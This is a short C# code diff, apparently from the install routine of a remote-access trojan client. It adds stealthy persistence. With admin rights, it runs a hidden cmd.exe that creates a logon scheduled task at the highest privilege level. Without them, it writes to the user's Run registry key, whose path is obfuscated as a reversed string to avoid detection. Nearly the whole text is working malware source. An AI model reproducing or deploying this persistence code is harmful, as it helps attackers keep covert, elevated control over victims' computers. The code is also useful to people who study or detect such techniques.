@@ -36,10 +36,26 @@ namespace Client.Install
                             Debug.WriteLine("NormalStartup Error : " + P.ProcessName);
                         }
                     }
-
-                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey(Strings.StrReverse(@"\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS"), RegistryKeyPermissionCheck.ReadWriteSubTree))
+                    if (Methods.IsAdmin())
                     {
-                        key.SetValue(Path.GetFileName(installfullpath), "\"" + installfullpath + "\"");
+                        Process proc = new Process
+                        {
+                            StartInfo = new ProcessStartInfo
+                            {
+                                FileName = "cmd.exe",
+                                Arguments = "/c schtasks /create /f /sc ONLOGON /RL HIGHEST /tn " + @"""'" + Settings.InstallFile + @"""'" + " /tr " + @"""'" + installfullpath + @"""'",
+                                WindowStyle = ProcessWindowStyle.Hidden,
+                                CreateNoWindow = true,
+                            }
+                        };
+                        proc.Start();
+                    }
+                    else
+                    {
+                        using (RegistryKey key = Registry.CurrentUser.OpenSubKey(Strings.StrReverse(@"\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS"), RegistryKeyPermissionCheck.ReadWriteSubTree))
+                        {
+                            key.SetValue(Settings.InstallFile, "\"" + installfullpath + "\"");
+                        }
                     }
 
                     FileStream fs;
